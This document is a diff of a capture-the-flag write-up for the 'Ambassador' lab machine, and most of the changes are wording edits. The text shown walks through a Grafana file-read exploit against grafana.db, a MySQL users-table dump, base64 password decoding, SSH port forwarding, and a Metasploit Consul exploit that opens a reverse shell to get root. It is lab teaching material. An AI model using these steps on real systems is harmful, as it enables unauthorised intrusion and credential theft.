@@ -1,4 +1,4 @@
-Target:10.10.11.182     Ambassador
+**Target:10.10.11.182     Ambassador**
 
 **Initial Access:**\
 nmap 10.10.11.183 -Pn --min-rate=5000 -p-\
@@ -50,7 +50,7 @@ Output is quite a lot, so let’s search for interesting words.  Use control f t
 The username is admin, password is messageInABottle685427 \
 Log into http://10.10.11.183:3000/login with the credentials we found.  It works, we get logged in.
 
-Navigating around the site for a while and not finding much of interest.  Let’s go back to our exploit and see if we can find something else.
+Not much of interest found on this page. Let’s go back to our exploit and see if we can find something else.
 
 Another page that comes up when you google search ‘what directory is grafana credentials stored in’ is /var/lib/grafana/grafana.db.  Run the exploit to read grafana.db file:\
 python grafana8.3.py -H http://10.10.11.183:3000   → when prompted for the file to read, enter /var/lib/grafana/grafana.db
@@ -63,20 +63,20 @@ It works, we get logged in.
 
 ![image](https://user-images.githubusercontent.com/93153300/198726117-aa4b0820-0282-408e-b593-a9d9ae343cd2.png)
 
-Check the databases:   show databases;
+Check the databases with command:   show databases;
 
 ![image](https://user-images.githubusercontent.com/93153300/198726209-bf34650e-1e63-476d-a7db-bb3bd2dee693.png)
  
-Select whackywidget: use  whackywidget;\
-Check the tables in whackywidget:  show tables;
+Select whackywidget with command: use  whackywidget;\
+Check the tables in whackywidget with command:  show tables;
 
 ![image](https://user-images.githubusercontent.com/93153300/198726226-d75d612f-e7c0-4e12-9f27-6d2b22c202c1.png)
 
-Dump the information of table users:  select * from users;
+Dump the information of table users with command:  select * from users;
 
 ![image](https://user-images.githubusercontent.com/93153300/198726242-80465b57-d9b1-441d-8ee8-3a549ee8e39d.png)
 
-We found developer username and credentials.  Looks like the password is base64 encoded.  Decode it using command:  echo -n "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="|base64 -d\
+We found username developer and a password.  Looks like the password is base64 encoded.  Decode it using command:  echo -n "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=="|base64 -d\
 Decoded to plaintext password: anEnglishManInNewYork027468
 
 Let’s try to log into ssh with these credentials.
@@ -105,8 +105,7 @@ Consul runs on port 8500, from our nmap at the beginning, we know that we do not
 ![image](https://user-images.githubusercontent.com/93153300/198726328-6b674bf3-5025-47cd-8aae-6641a313295d.png)
 
 
-The output from netstat -ln shows that port 8500 is open but only from 127.0.0.1.  So to make this accessible to us we need to forward that port.   To get our target shell into the port forward: ~c .\  
-Next: -L 4444:127.0.0.1:8500\
+The output from netstat -ln shows that port 8500 is open but only from 127.0.0.1.  So to make this accessible to us we need to forward that port.   To get our developer target shell into the port forward mode type: ~c. Next use command: -L 4444:127.0.0.1:8500\
 This means that whenever we go to our 127.0.0.1 at port 4444 then we will be redirected to the target 127.0.0.1 on port 8500.  
 
 ![image](https://user-images.githubusercontent.com/93153300/198726345-6c238382-df17-4948-9433-0dac504553ec.png)
@@ -116,7 +115,7 @@ search Hashicorp Consul Remote
 
 ![image](https://user-images.githubusercontent.com/93153300/198726358-ab07741f-c882-496a-8dee-bb4d7b22ddf3.png)
 
-Choose the exloit:  use multi/misc/consul_service_exec\   
+Choose the exloit with command:  use multi/misc/consul_service_exec \
 Fill out the exploit with the following commands:\
 show options → set lhost tun0 → set lport 443 → set rhosts 127.0.0.1 → set rport 4444 → set acl_token  bb03b43b-1d81-d62b-24b5-39540ee469b5\
 It should look like this:
@@ -124,12 +123,8 @@ It should look like this:
 ![image](https://user-images.githubusercontent.com/93153300/198726372-89ecd2f6-84c8-48cd-966f-f0a71a1f8d5f.png)
 
 
-To run the exploit use command: run
+To run the exploit use command: run \
 We have shell as root, open /root/root.txt to get the flag. 
 
 ![image](https://user-images.githubusercontent.com/93153300/198726401-f965cca4-e7b8-4e57-8ed8-c3594e3fd824.png)
-
-
-
-
 
